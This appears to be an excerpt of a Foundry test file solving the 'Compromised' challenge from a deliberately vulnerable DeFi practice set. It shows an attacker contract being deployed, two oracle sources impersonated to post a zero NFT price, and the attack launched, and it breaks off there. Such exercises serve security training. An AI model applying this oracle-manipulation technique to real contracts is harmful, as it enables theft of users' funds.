...
import "attacks/CompromisedAttack.sol";
...
contract Compromised is Test {
    ...
    function testExploit() public {
        vm.prank(attacker);
        CompromisedAttack atk = new CompromisedAttack(
            payable(address(exchange)),
            address(trustfulOracle),
            address(trustfulOracleInitializer),
            address(damnValuableNFT)
        ); 
        
        vm.prank(address(sources[0]));
        trustfulOracle.postPrice("DVNFT", 0);
        vm.prank(address(sources[1]));
        trustfulOracle.postPrice("DVNFT", 0);

        vm.deal(address(atk), 0.1 ether);
        atk.attack();
